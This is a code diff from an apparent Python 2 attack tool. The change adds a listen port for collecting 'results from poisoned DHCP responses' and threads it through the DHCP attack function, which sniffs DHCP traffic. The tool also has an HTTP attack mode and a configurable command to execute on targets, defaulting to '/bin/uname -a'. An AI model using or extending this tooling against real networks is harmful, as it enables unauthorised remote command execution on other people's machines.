@@ -692,14 +692,14 @@ def print_progress(
 # DHCP Attacks
 #
 ###################
-def do_dhcp_attack(command, IP, port):
+def do_dhcp_attack(command, port):
     """ The main funtion for DHCP attacks. Accepts arguments passed in from the
     command line and outputs to the command line.
     """
     look_for_dhcp_servers()
     while True:
         print "[+] Waiting for DHCP requests..."
-        sniff(filter="udp and (port 67 or port 68)", prn=process_dhcp(command, IP, port))
+        sniff(filter="udp and (port 67 or port 68)", prn=process_dhcp(command, port))
 
 
 def look_for_dhcp_servers():
@@ -949,6 +949,13 @@ def main():
         help = 'HTTP Mode - The target port number (default=80)'
         )
     parser.add_argument(
+        '--listenport',
+        '-l',
+        default = 33442,
+        type = int, 
+        help = 'DHCP Mode - The port to listen on for results from poisoned DHCP responses (default=33442)'
+        )
+    parser.add_argument(
         '--command',
         default = "/bin/uname -a",
         help = "HTTP & DHCP Modes - Command to execute (default=/bin/uname -a)"
@@ -989,7 +996,8 @@ def main():
     command = args.command
     if args.Mode == "dhcp":
         print "[+] DHCP ATTACK MODE SELECTED"
-        do_dhcp_attack(command)
+        port = args.listenport
+        do_dhcp_attack(command, port)
     elif args.Mode == "http":
         print "[+] HTTP ATTACK MODE SELECTED"
         if args.Host:
